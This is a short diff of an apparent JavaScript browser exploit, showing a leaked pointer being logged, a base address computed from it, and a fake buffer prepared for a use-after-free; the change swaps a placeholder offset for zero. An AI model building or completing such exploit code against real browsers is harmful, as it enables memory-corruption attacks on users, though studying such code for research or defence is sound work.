@@ -196,8 +196,8 @@ addEventListener('unhandledrejection', event => {
   log(`[+] Leaked pointer: ${hex(leakPtr)}`);
 
   //const KNOWN = BigInt(off.heap_slide);
-     const KNOWN =0x12345678n;
-  const base = leakPtr - KNOWN;
+      
+  const base = leakPtr - BigInt(0x0n);  
   log(`[+] Computed base: ${hex(base)}`);
 
   const fake = new Uint8Array(UAF_SIZE);
